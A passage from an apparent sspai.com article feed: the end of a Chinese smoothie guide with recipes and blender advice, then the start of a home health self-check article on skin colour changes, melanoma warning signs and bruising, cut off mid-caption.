src=\"https://cdn.sspai.com/2021/07/21/ec3c42f25fd3a08ec88732064809039d.png\"></figure><h3>味觉搭配</h3>\n<p>香蕉和牛油果都能制造出很浓稠的质感，香蕉的味道更浓郁，为蔬果汁提供更多甜味，比如：牛奶+香蕉+可可粉就是一杯不错的能量补充。牛油果的味道不够突出，只能作为配角，但它可以为蔬果汁提供脂肪，增加饱腹感。</p>\n<p>另外，奇亚籽、亚麻籽、杏仁酱、芝麻酱、花生酱等，也能为蔬果汁增稠，花生酱、杏仁酱、芝麻酱还能改变整体的味道，为整杯蔬果汁增加风味亮点。</p>\n<p>还有一些香料可以为蔬果汁增色，比如肉桂粉加入含有苹果的蔬果汁里，薄荷和柠檬搭配，姜和很多甜味的蔬果也可以搭配，菠萝、百香果、芒果自带浓郁的热带风情。</p>\n<p>椰子类的食材，比如椰子肉、椰子油、椰汁、椰奶、椰子粉，加进去会让蔬果汁的味道增加一丝热带风味，同时也增加了营养。</p>\n<p>还有苦味，很多时候大家不愿意吃苦瓜，但是熟透的苦瓜种子红彤彤的，这一层红肉非常甜，而苦瓜本身和黄瓜、苹果搭配也能做出非常适合入口的感觉。</p>\n<p>另外，蔬果汁的状态和添加的食材有关，加入冷冻的食材可以做出冰沙的效果，适当增加牛油果、香蕉、奇亚籽、鹰嘴豆泥等搅碎有浓稠感的食材，也能制造出流动性比较低的浓浆感。加入含水量多的食材自然打出来的更像一杯果汁。</p>\n<h3>食材的加入顺序</h3>\n<p>如果搅打食材的量不多，是完全可以一股脑加进杯子里的，不过在这里说添加顺序是因为不同食材含水量和状态不同，搅碎后的效果也会有所不同，从刚开始尝试蔬果汁时开始熟悉各种吃常用食材搅打前后的特征，之后就可以很容易搭配出更符合自己喜好的蔬果汁。慢慢开始摸索出自己的口味喜好之后，一口气把所有食材都加进去绝对不是问题。</p>\n<p><strong>先加柔软、汁水充沛的蔬果，再放较硬或者水分少的食材。</strong>为了保持蔬果汁的原味，通常不会事先加入足量的水，先加入汁水充沛的蔬果食材是为了给后面的搅打提供足够的水分，不过如果实在不足以支撑搅拌就需要适当加入液体进行均衡，保证搅打更均匀，可以选择汁水充沛的食材和较硬较干的食材轮流加入。</p>\n<p><strong>之后再放入颗粒、粉末、香料进一步调味。</strong>加入粉末类调味料可以补充添加一些口味，增加蔬果汁的风味，进行最后的风味调整，有时候最后加入的粉末会为整杯蔬果汁注入灵魂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5d284aa48993b325b34b2d954e0431d7.png\"></figure><ul>\n<li>\n<strong>液体类：</strong>水、酸奶、牛奶、椰奶、椰汁、豆奶、豆浆等</li>\n<li>\n<strong>柔软、汁水充沛的食材包括：</strong>梨、各种甜瓜、西瓜、浆果、香蕉、猕猴桃、蓝莓、叶茎类青菜、黄瓜、番茄等</li>\n<li>\n<strong>较硬、水分少的食材：</strong>燕麦片、坚果、胡萝卜、菠萝、牛油果、冷冻蔬果食材等</li>\n<li>\n<strong>颗粒粉末类：</strong>奇亚籽、胡椒粉、姜黄粉、可可粉、杏仁粉、抹茶粉等</li>\n</ul>\n<h2><strong>我家常用的蔬果汁配方</strong></h2>\n<p>我家常用的配方基本上都是比较容易买到的食材，有些食材还相对来说更耐储存，当然时常也会变换一下配方，拓展新的食材。</p>\n<h3>💣维他命炸弹</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/58a3127450123cab0847b268242728ea.png\"></figure><p>用料：胡萝卜半根，苹果半颗，姜2mm薄片一片，200ml 纯净水。</p>\n<p>胡萝卜和苹果是蔬果汁里的常客，可以说是物美价廉。胡萝片提供丰富的维生素A，胡萝卜素和维生素B、钾，加入苹果贡献更多甜感，缓解胡萝卜入口的大颗粒感，反正都要搅碎，所以苹果核都不必浪费。姜的加入给整个配方提供了一种异域风情，有点微微灼烧的感觉成了这杯蔬果汁的亮点。</p>\n<p>苹果切成小块，胡萝卜切丁，姜片只需要薄薄的一片就够了。先加入苹果，可以适当加点纯净水帮助搅打，之后加入胡萝卜和姜片，充分打匀就好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a34b3a0fed25112735a65cd2e8f2a8bb.png\"></figure><p>这一杯蔬果汁的蔬果比例更接近1:1，但因为苹果和胡萝卜都不属于多汁的类型，所以会有比较明显的颗粒感，口味上也更倾向于带甜味的胡萝卜，姜的加入会给身体带来微微热辣的感觉，从嘴里蔓延到喉咙，再扩展到全身，很适合唤醒沉睡的脑袋，营造一种舒适的生活气。早餐吃两片松饼配煎蛋，加上胡萝卜大颗粒的嚼感，半嚼半饮，小麦的甜感搭配上这一杯维他命炸弹，唤醒元气新一天。</p>\n<h3>🌳绿光</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/0d184870195e42de6d301a7e09ef5036.png\"></figure><p>用料：黄瓜半根，苹果半个，菠菜50g，纯净水150ml。</p>\n<p>黄瓜和菠菜是家常菜里非常常见的食材，不能空口生吃一根黄瓜的人，可以试试这个配方。黄瓜和菠菜的水分都算是充足的，很容易出汁，黄瓜切大块就够了，菠菜手撕都可以，苹果切丁，加水充分搅打均匀，是一杯比较深邃的绿。</p>\n<p>💛特别注意：由于菠菜里的草酸较高，会影响钙质的吸收，需要焯水之后再食用哦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/460bf4c37c3aa97e38d8492a2f91f6bf.png\"></figure><p>这一杯的蔬菜和水果的比例是3:1，是我心目中很完美的蔬果汁配比了，一杯可以吃掉150g蔬菜。味道上以黄瓜的清香为主，苹果的甜味起到了很好的中和作用，整体很水润，喝起来有一种在湿润的森林里深呼吸的感觉，很清新还带着微甜。</p>\n<h3>🔥燃缤纷</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/d8cdacfadd5421e1456e2bc92545d3f5.png\"></figure><p>用料：胡萝卜半根，苹果半颗，番茄半个，150ml 纯净水。</p>\n<p>番茄、胡萝卜和苹果无论在什么地方，都应该是很容易买到的食材。椰子水在今年在椰子风席卷整个街头饮品业之后，应该也比较好买到吧，不过可以用清水替代。番茄随便切切，一开始搅拌立刻就释放出了很多汁水，令人开心的红色。苹果和胡萝卜都比较硬，切小块，再加入椰子水，充分搅打均匀就好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3634e4b3e3d63c1428392884a0236757.png\"></figure><p>对比「维他命炸弹」，这一杯会更容易入口，适合刚开始适应蔬果汁的阶段。番茄为这杯蔬果汁提供了更多的水分，所以这一杯蔬果汁会更顺滑，更加倾向于「汁」的状态，加入椰子水或者清水都行，椰子水能够提供一点淡淡的椰香，虽然和「维他命炸弹」看起来食材近似，但味道却转向了更柔和甜美的方向。</p>\n<p>这一杯的蔬果比例更接近7:3的理想比例，番茄和胡萝卜的味道占据了主要的位置，苹果只能作为提供甜味的配角。虽然蔬菜的含量变高了，但这一杯整体来说非常容易入口，也很容易接受，多亏了多汁又亲民的番茄，还有人人都爱的椰子水。</p>\n<h3>🦖绿巨人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/d2dd66895654306f81484fe33b898b57.png\"></figure><p>用料：菠菜 70g，香蕉四分之一根（30g 左右），椰奶 100ml，坚果适量。</p>\n<p>坚果我用的是大杏仁和腰果，菠菜随便切成小段，但需要焯水。香蕉切片。菠菜是柔软多汁的蔬菜，香蕉又能提供顺滑的口感，椰奶和坚果也有增香的效果，会让整杯蔬果汁有更浓郁的味道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3471266b7f488905206e932bfff9e0fa.png\"></figure><p>因为菠菜占主要成分，这一杯整体是绿色的，香蕉和椰奶稀释了菠菜的深绿，变成了更淡一点的牛油果绿。菠菜的味道几乎完全被香蕉和坚果的味道盖住了，喝起来很柔和，最后有非常明显的坚果香气。不爱吃菠菜的朋友们，扩充自己食物边界的时刻到了☝️。</p>\n<h3>💥能量爆棚</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a7fc106eacd36fe6a7a869444f6c979a.png\"></figure><p>用料：羽衣甘蓝 70g，葡萄按喜好放吧，不用太多十颗差不多了，椰奶 100ml，坚果适量。</p>\n<p>用家里的食材是完全可以随意拼凑出一杯不错的蔬果汁的。比起苹果，我们家的常驻水果其实是葡萄，葡萄不用去皮不用去籽，洗干净就够了。因为最近一年我们家住在宇宙中心，羽衣甘蓝能够很方便地买到，所以羽衣甘蓝也成了家里的常驻蔬菜。不过比起菠菜，羽衣甘蓝的纤维感更明显，好在羽衣甘蓝不需要再过水焯了。羽衣甘蓝搅碎入口的状态更接近胡萝卜，水分也不如菠菜多，但依旧不妨碍它是一款很适合沙拉和蔬果汁的食材。因为最近大半年每周都会自己烤酸面包，所以坚果也是常驻选手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/16d818fac314c6f34d3351d49470a495.png\"></figure><p>羽衣甘蓝提供纤维感的口感，坚果是以开心果仁为主的，搅打出来是微微的淡绿色，和绿色的蔬菜毫无冲突，是浓郁的香味，葡萄把羽衣甘蓝的蔬菜味融合掉，葡萄皮和葡萄籽的碎屑给整体绿色的蔬果汁提供一点点深色的点缀，椰奶会柔滑整个融合，把绿色稀释到很温柔的状态，喝它的感觉有一种坚果夹心威化饼的感觉，葡萄的碎籽和坚果碎在嘴里碰撞，香味和营养在嘴里爆炸。</p>\n<h3>🍋丰收果实</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/adc7285a9df96ed6f2a470e7ef85a762.png\"></figure><p>用料：甘蓝 80g，菠萝 50g，柠檬 一小片，纯净水 150ml。</p>\n<p>甘蓝是能凉拌的菜，如果不加一些调味料，总能感觉到它后劲儿的辛辣，它搅碎之后水分充沛，自然有一种淡淡的绿色，很好看。菠萝用盐水泡应该是我妈传授给我的，不知道有没有起到什么化学反应，但用盐水泡过的菠萝就像酸嘢一样，有一种生津的效果，也会让菠萝尝起来更甜，再加一点柠檬，调整风味，加香蕉增加甜味，这么一通操作下来，甘蓝的辛辣味完全被中和掉，变成了一杯很清爽的蔬果汁。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3bc2907814fb9c4fb51770ce313ce37e.png\"></figure><p>这个是意外发现的食材组合，之前在某个轻食餐厅点过类似的蔬果汁，不过他们以菠萝为主，蔬菜选择了菠菜，有很突出的热带风味，颜色因为菠菜的加入也更深了。我这一杯因为香蕉的加入变得更顺滑，各个食材比较突出但又不太是优点的口味都被融合减弱了，整体就变得更清爽干净，内心对它的定义更像一杯淡淡的茶。</p>\n<h3>💫魔法学校</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ddb65b8cf1d9ad85ae19b619fb5d0fc3.png\"></figure><p>用料：羽衣甘蓝 60g，菠菜 50g，苹果四分之一颗，梨 一颗，奇亚籽 10g。</p>\n<p>奇亚籽需要用水泡一下，比例大约 1:10，15 分钟左右就可以泡开了，奇亚籽吸水膨胀可以达到5倍以上，所以千万不要干吃奇亚籽哦☝️。水直接留着，不需要再额外加水了。菠菜需要焯一下，苹果和梨切块，我用的梨是库尔勒香梨，水分不多，但雪梨之类的更常见的品种水分会更充足。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/adb993a7a95fdd67615c036e244a1f5f.png\"></figure><p>奇亚籽是我很喜欢的食材，它含有非常丰富的膳食纤维，是很好的膳食纤维补充来源，也赋予了这杯蔬果汁滑溜溜的口感，苹果和梨提供甜味，中和菠菜和羽衣甘蓝的蔬菜生涩味，苹果和梨都可以完全不去核，梨核还会有一点点酸酸的感觉，丰富味道的层次，蔬果和营养谷物的组合，是我比较满意的搭配方案。</p>\n<h3>🍊亮橙橙</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ffc73b897b9199664ad82a24814b4364.png\"></figure><p>用料：橙子两颗，胡萝卜半根，柠檬片一小片，纯净水 150ml。</p>\n<p>橙子两颗去皮，胡萝卜切丁，柠檬切一片，纯净水的多少视橙子出汁量而定。橙子直接用水果刀把皮切掉，简单切大块或者完全不切，搅拌机是可以很轻松搅碎的，橙子的果汁非常丰富，胡萝卜切小粒，柠檬负责丰富整杯饮品的香味。因为橙子的汁水充沛以及水的加入，可以让胡萝卜的纤维感没有那么明显，也更好入口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/14944f872c38cff99e27b9b033a985a3.png\"></figure><p>我常喝的蔬果汁里，胡萝卜是一个很重要的元素，小时候就很爱喝胡萝卜汁，当然是经过调味的。虽然它炒起来也很好吃，但我熟吃的频率并不高，生吃并不是所有人都能接受的，所以搭配一些甜感明显的水果，它就会被衬托得格外美味，用食材搭配来调整口味的偏好，帮助自己达到营养更均衡的效果，虽然是一种欺骗，但是也是善意的谎言☝️。</p>\n<h3>🧚‍♀️绿野仙踪</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/1823dfc13d8879e2cfd15ce17b5c616e.png\"></figure><p>用料：生菜100g，柠檬 一小片，芹菜适量，苹果半颗，纯净水150ml。</p>\n<p>苹果切小块，柠檬切一小片，生菜整片随便撕一撕就可以了，芹菜可以选择芹菜叶也可以选择芹菜杆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/17ee89dd08f37074c6e5cc8ccd3e079a.png\"></figure><p>不喜欢芹菜味道的朋友，请跳过这一杯或者用芹菜杆，而不是芹菜叶。哪怕只要几片芹菜叶也会把整杯蔬果汁都带成芹菜味，所以它是这一杯里的口味王，如果换成芹菜杆，味道就会小很多。生菜没什么特别的味道，柠檬负责平衡整体的口味，增加一点微微的酸和柠檬香，苹果提供甜味。</p>\n<h3>🦸‍♀️纤维超人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/006d4155ae0d44400ef8ec1307a5f0ea.png\"></figure><p>用料：羽衣甘蓝 80g，苹果四分之一颗，牛油果（熟透的）二分之一颗，椰奶 150ml。</p>\n<p>牛油果切块，我的牛油果切开发现还不够熟，这一点影响了整杯蔬果汁的口感😭，所以牛油果一定要用熟透的☝️。苹果切块，羽衣甘蓝随便撕一撕，椰奶也能换成牛奶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ee60be7c42ec1dd3974c68af89223f97.png\"></figure><p>牛油果加入到一杯蔬果汁里，在味道上几乎不会有任何体现，非常微弱，但它会提供能量，并且改变蔬果汁的流动性，变得浓稠滑糯，前提是要用很熟的牛油果哦。牛油果的软糯会中和羽衣甘蓝的纤维感，苹果的甜也会弥补蔬菜的青涩，加上牛奶或者椰奶，整杯的颜色也会变得赏心悦目，入口的感觉也很自然，多了一丝香甜。</p>\n<p>🏁 蔬果汁的配方就先写到这里吧，接下来说一说制作蔬果汁的机器。</p>\n<h2><strong>选择制作蔬果汁的机器</strong></h2>\n<p>可以制作蔬果汁的机器有好几种，有可以汁渣分离的原汁机，高转速的破壁机，还有价格便宜实惠的料理机，还有做宝宝辅食会用到的料理棒。应该怎么选择制作蔬果汁的机器呢？</p>\n<p>家里已经有以上任意一台机器，可以随便用，不需要再单独购买了。如果没有的话，可以从以下几个方面进行选择。</p>\n<h3>各个品类的特性</h3>\n<p>可以汁渣分离的原汁机，看起来非常高级，十年前很多广告都在推荐它，给人一种精致生活的感觉。但是如果是想主要作为制作蔬果汁的机器，<strong>我个人最不推荐买它</strong>。因为它剥离了蔬果的果肉和纤维，在营养上会造成一定的缺失，而且也比较浪费。不过如果家里已经有了原汁机，还想健康饮用蔬果汁，也可以考虑把蔬果纤维再加工重新吃下去😂。有的果肉纤维在收纳滤盒里也是完全打碎的状态，尝试把它混合到之前的果汁里，或者单独做成蔬菜饼也未尝不可。</p>\n<p>破壁机、料理机、果汁杯、料理棒这些在机器刀头的转速和外形上有所差异，但整体的思路都是把食材打碎，而不产生废弃的蔬果渣，可食用的部分更完整，购买的话可以优先考虑。</p>\n<p>就大部分产品而言，这几种产品的刀头转速排序是<strong>破壁机 &gt; 料理机 ≥ 料理棒 &gt; 果汁杯</strong>。</p>\n<h3>拆洗的方便程度</h3>\n<p>通常来说，原汁机的清洗最为复杂，需要拆除很多部件，进行一一清洁，很多滤网细小的空洞也需要多加注意。在拆洗这件事上，原汁机又扣分了☝️。</p>\n<p>不过其他机型也需要在清洗上稍下功夫，破壁机通常都是大底座+有丰富细节的杯子，细小的食物残渣容易潜入各种缝隙，需要额外留意。料理机在外形上更像破壁机，和料理棒的差异在于到头是否能和搅打食材的容器分离。料理棒的刀头部分能拆成比较单独的部件，杯子和刀头分离，所以只要仔细冲洗就可以。另外，果汁杯品类繁多，因为比较小巧，清洗的心理压力会没有那么大。</p>\n<p>在拆洗的方便程度上，<strong>破壁机 ≥ 料理机 &gt; 果汁杯 ≥ 料理棒。</strong></p>\n<h3>价格</h3>\n<p>在价格上，常见品牌的原汁机、破壁机、料理棒、料理机的价格能够相差好几倍，便携果汁杯通常都可以在比较便宜的价位买到。千元的预算，大部分都能买到，百元以内，就只剩基础款的果汁杯或者料理机了。这个需要根据自己的预算和需要进行对比。</p>\n<h3>其他功能需要</h3>\n<p>这个主要是为了看除了制作蔬果汁外，对机器还有什么额外的需求。</p>\n<p>果汁杯和原汁机基本上就是榨汁的需求了。</p>\n<p>有的料理机或者破壁机是有加热功能的，煮粥、豆浆都能完成，很多料理机会配好几个刀头，当作研磨机、绞肉机。料理棒没有加热功能，但是也可以根据需要选择刀头，绞肉或者婴儿辅食，有的还可以做冰沙。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/b502fa1520834eab7218ce542cf96e73.png\"></figure><p>我家之前是一款小熊的果汁杯，能满足当时偶尔使用的需求，我也会用它把泡好的黄豆打碎，然后自行用滤网过滤，再用锅煮豆浆，比较原始的方法。但最近两年做饭的频率和难度都有所提升，所以家里迭代了之前的果汁杯，换成了可以无极换挡的搅拌棒。大部分时间是用来做蔬果汁，还会用来做红豆沙、鹰嘴豆泥、豆浆、果酱和各类肉丸。我爸妈家用的是破壁机和原汁机，常用的还是破壁机，他们用来打豆浆和杂粮粥，原汁机因为清洗麻烦，有点闲置。</p>\n<p>综合上面的几个方面以及我自己的使用体验，<strong>我更推荐大家从破壁机、料理机、料理棒和果汁杯里做选择</strong>。</p>\n<h2>🧙‍♀️彩蛋</h2>\n<p>嘿嘿，该来的还是来了。附赠一个魔法料理🪄！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/007880c67ecdc4ea20135fae6d7f0691.png\"></figure><p>用料：羽衣甘蓝 60g，香蕉四分之一根，蓝莓干适量，可可粉一丢丢，椰子水 150ml。</p>\n<p>这一杯的关键在于可可粉，可可粉可以加多可以加少，非要做黑暗料理的话，可以加一整勺，不想成为黑暗料理届的代表人物的话，可以考虑稍稍加一小撮，5g 以内，不要更多了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5f5e6e509024dce848b4757896ab08f7.png\"></figure><p>可可粉我为了拍图的时候更明显，刻意多倒了一些在小碗里，结果打蔬果汁的时候，忘了这件事，一口气都放进去了😭。加多了的后果是除了香蕉的味道无法被它掩盖之外，其他的口味完全被埋没了。既然无法亲口品尝魔法的力量，就快来用眼睛感受这神秘又矜持的魔力吧(๑•̀ㅂ•́)و✧。</p>\n","link":"https://sspai.com/post/67831"},{"title":"掌握这些健康自查手段，不再疑神疑鬼","date":"2021-07-21 06:30:00","description":"\n<p>编注：本文为「体检指南」系列文章的第三篇，也是最后一篇，主要介绍一些比较方便进行的自查项目，供读者用于关注自身健康状况，以便及时就医。</p>\n<hr>\n<p>大家好，我是致力于让没有医学背景的小伙伴能听懂医生在说啥的心内科 Leslie Pan。</p>\n<p>本文是体检指南系列的第 3 篇，主要和大家简单地介绍一下能够自己在家完成的健康自查，一共 4 部分，按照自查的难易程度，分为<strong>自己看得到的</strong>，<strong>自己上手摸/按得出的</strong>，<strong>需要别人帮忙看/触的</strong>以及需要<strong>依靠一些小工具和家用医疗器械检测</strong>的。</p>\n<p>温馨提示：全文 13000 字左右（取了个「指南」这么大的标题，不给大家整个一万字我都不好意思）。文章中每个小节的内容拓展起来都可以单独写篇万字科普，受限于篇幅和个人水平，这篇稿子既不可能穷尽所有症状，也无法将单一的症状或体征讲得足够清晰，主要目的是提醒大家<strong>留意自己身体传达的健康/疾病信号</strong>，有异常尽早就诊，有问题及时治疗。</p>\n<p>我还想强调一下：</p>\n<ul>\n<li>自查<strong>不能代替体检</strong>。</li>\n<li>要关注健康但<strong>不要过分焦虑</strong>，大家也不要每一个症状都对号入座。</li>\n<li>文中有一些展示症状体征的图片，有可能会引起不适观感，我们将一些可能引起不适的图像进行了模糊处理，并将<strong>未经模糊的原图附在图注超链接中</strong>，请<strong>酌情阅读</strong>。</li>\n</ul>\n<p>如果大家有格外感兴趣的而我没有写到的点，可以在评论区里告诉我，有机会的话可以展开来好好聊聊。</p>\n<h2><strong>自己看得到的</strong></h2>\n<p>我们在全身最容易观察到的，就是身体最外层的屏障——皮肤和粘膜。通过观察皮肤粘膜的颜色、弹性与紧绷程度、色素沉着、充血状态等特点，我们可以得到很多信息，为我们判断自己的健康状态提供线索，医生的查体也是通过观察体征寻找疾病发生的征象。作为没有医学背景的普通人，大家应该怎么去看皮肤和粘膜呢？下面我们按照部位或者特点来一个个说。</p>\n<h3><strong>皮肤颜色</strong></h3>\n<p>皮肤的颜色其实受很多因素的影响，美妆博主会拿出一张表来黄调白调分好几个度，今天我们要看的不是色号，而是健康程度，因此，皮肤颜色改变需要和自己健康时的状态比，这一点还是自己最清楚。皮肤整体的颜色与血管、血液供应、血液里的成分有很大关系，局部的颜色则与色素沉着、毛细血管有关。</p>\n<h4><strong>发白——可能有贫血</strong></h4>\n<p>贫血的人由于缺血<strong>皮肤粘膜会比较苍白</strong>，光看皮肤可能不大容易判断，我们可以观察一些血供丰富、皮肤菲薄的部位，例如眼睑、手掌、指甲、舌头等。如果拉开下眼睑（小盆友做鬼脸的姿势）发现本应红润的睑结膜变得苍白，嘴唇、手掌、舌头也没有血色，可能是贫血了。有的女性每月月经量很大，平时<strong>皮肤苍白又怕冷，还经常觉得没力气头晕</strong>，可以自己看一下上述几个部位，很明显的苍白的话最好还是去医院查个血常规。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/3300b3f025185d02bab0912d457c8a92\"><figcaption>⬆️ 动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=IyPsiyDUTAY\" target=\"_blank\">Pale Conjunctiva - A Sign of Anemia from Dr. Dave's 411</a></figcaption></figure><p>如果只是一小块地方比其他地方白，大小不等，边缘还比较清楚，也有可能是汗斑或者白癜风，可以找皮肤科医生看一下。</p>\n<h4><strong>发紫——可能是缺氧</strong></h4>\n<p>专业术语叫发绀/紫绀，血液里的血红蛋白要被氧化后才会呈现正常的红色，而机体缺氧时，没有被氧化的血红蛋白太多了，会引起耳垂、嘴唇等皮肤较薄的区域呈现出紫色。<strong>依据病因不同可以分为中心性、周围性和混合性发绀</strong>。</p>\n<p>我童年有个同学有严重的先天性心脏病，嘴唇是紫的，经常蹲在地上喘气，二年级以后我就没能再见到她。她就是心脏疾病引起的中心性发绀。<strong>中心性发绀主要由肺部疾病、呼吸道阻塞、心脏疾病或血液中有变性血红蛋白引起，发绀可以出现在全身的皮肤、口唇粘膜甚至眼睛的结膜。</strong></p>\n<p><strong>周围性发绀主要见于各种周围循环障碍性疾病，</strong>例如静脉淤血、肢体末端循环障碍的疾病（雷诺病）、外周动脉阻塞等，发紫的部位可广泛分布，也可位于局部，多出现于<strong>肢体末端，如手指、甲床、足、鼻子及耳廓等处</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/1c613557ba0895a78bff046ee9ccd472.jpg\"><figcaption>上图左为典型的中心性发绀，小朋友唇舌均发紫，同时双手末梢发紫伴杵状指（肢体末端组织缺氧等原因造成指甲根部体积的增大，状如鼓槌，压之如海绵状）；右为甲床紫绀+杵状指与正常状态的对比。高清原图请点击 <a href=\"https://cdn.sspai.com/2021/07/20/6766784634740788f9540c344e85a47f.jpg\" target=\"_blank\">这里</a> 查看。</figcaption></figure><p>如果只是嘴唇纯色偏深，既没有胸闷气喘、怕冷乏力的症状，也没有其它不适或身体其他部位的发紫，那可能是你涂了口红长期没有认真卸妆😜。</p>\n<h4><strong>发黄——黄疸（jaundice）或者胡萝卜素摄入过多</strong></h4>\n<p>体检指南里我们提到了一个生化里的检测项目——胆红素，血液里的胆红素严重超标时会出现肉眼可观察到的<strong>皮肤黏膜发黄，先出现在眼睛的巩膜——也就是眼白</strong>，再高下去全部皮肤都会发黄。这种情况通常是肝胆出现了明显的病变了，一定要去医院。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/ab41da69e4374ec270195d8e17707e47\"></figure><p>当然，也有没有什么大病也黄了的情况。著名医疗剧《豪斯医生》里就有一集，豪斯医生上门诊，看着脸色发黄、一脸惶恐的男病人说「你有没有大病我暂时不敢肯定，但你老婆一定移情别恋了，你都变这么黄了她都没看出来？！」结果就是这个移情别恋的老婆敷衍病人的三餐，老给他吃胡萝卜，导致他血里胡萝卜素含量超标了。但这种黄一般先出现在手掌脚底，不太出现在眼白。</p>\n<p>因此如果发现自己的眼白黄的厉害，赶紧去看肝胆外科。</p>\n<h4><strong>局部区域发黑（色素沉着）</strong></h4>\n<p>黑色棘皮症</p>\n<p>几个月前吃播 up 主泡泡龙去世引发了网络上一小段时间热议，网友发现以前视频评论里就有人提醒 up 主，脸上出现的黑斑很像黑色棘皮症，建议 up 主不要总是暴饮暴食，最好去医院查查有没有糖尿病，但遗憾的是这条评论没能引起泡泡龙的重视。</p>\n<p>这里提到的<strong>黑色棘皮症</strong>是一种经常出现在肥胖者身上的皮肤病变，常常出现在皮肤褶皱处，例如<strong>腋下、腹股沟、脖子</strong>等部位，<strong>局部皮肤增厚、毛囊角化过度，出现鸡冠皮样凸起，色素沉着发黑</strong>，表面看起来是绒毛状。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/e5ba7ed1024732e073a3e93355421129.jpg\"><figcaption>高清原图请点击 <a href=\"https://cdn.sspai.com/2021/07/20/85222b845a13a91bc9fff7b9d913ea16.jpg\" target=\"_blank\">这里</a> 查看。</figcaption></figure><p><strong>皮肤黑色素瘤</strong></p>\n<p>我们身上最典型的黑色素沉着的地方就是色素痣了，痣本身没有什么特别的，不过有<strong>极少数的色素痣会恶变成皮肤黑色素瘤，</strong>考虑到这个肿瘤的<strong>恶性程度比较高</strong>，有必要提醒大家注意一下。</p>\n<p>高危人群包括有以下特征的：<strong>严重的日光晒伤史，皮肤癌病史，肢端皮肤有色素痣、慢性炎症，及其不恰当的处理，如盐腌、切割、针挑、绳勒</strong>等。视诊则是早期诊断皮肤黑色素瘤最简单的手段。</p>\n<p>早期恶变的症状有 ABCDE 五大特点：</p>\n<ul>\n<li>\n<strong>A</strong>symmetry：不对称，色素斑的一半与另一半看起来不对称。</li>\n<li>\n<strong>B</strong>order irregularity：边缘不规则，不像正常色素痣那样有圆形或椭圆形的光滑轮廓。</li>\n<li>\n<strong>C</strong>olor Change：颜色改变，正常色素痣通常为单色，黑色素瘤则颜色更浑浊，还会有棕、褐、蓝、粉、黑、白等多种颜色。</li>\n<li>\n<strong>D</strong>iameter：直径更大，色素痣直径超过 5mm 或明显长大时要注意，对＞1cm 的色素痣最好去看皮肤科，看看要不要做活检评估。</li>\n<li>\n<strong>E</strong>levation：隆起，一些早期的黑色素瘤，整个瘤体会有轻微隆起。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/6fadc4da0f997e9b86ea90d8aa76f53b\"><figcaption>图片来源：<a href=\"https://www.aimatmelanoma.org/melanoma-101/early-detection-of-melanoma/how-to-tell-a-mole-from-melanoma/\" target=\"_blank\">https://www.aimatmelanoma.org/</a></figcaption></figure><h3><strong>皮下瘀点瘀斑</strong></h3>\n<p>相信大家都摔倒过吧，有时候摔倒的地方会秃噜皮，没破皮的地方可能会肿起来、变成青紫色，其实就是外伤引起的皮下出血。这里我们要讲的是<strong>没有外伤的情况下，自发出现的皮下出血，由此引起皮肤或粘膜出现紫红色的病变。</strong>一般根据直径大小可以分为几种：2mm 以下为瘀点，3-5mm 为紫癜，5mm 以上为瘀斑，这些皮下出血意味着血液从血管里跑出来了，<strong>往往提示造血系统、凝血功能或者各种原因引起了毛细血管通透性的问题，可能是血小板减少、凝血功能障碍或者血管性炎症疾病等</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/c7b7c1e88edbb733fcbefec07a9e95e5.jpg\"><figcaption>上：Petechiae - 瘀点，Purpura - 紫癜；下：双侧手背、手腕及部分区域可见大面积紫色瘀斑（Ecchymosis）。注：图片仅作示例用，真实个体的临床表现可能有差异，请勿自行下诊断。高清原图请点击 <a href=\"https://cdn.sspai.com/2021/07/20/4c8386a3aa609728864c33cf91b7ecde.jpg\" target=\"_blank\">这里</a> 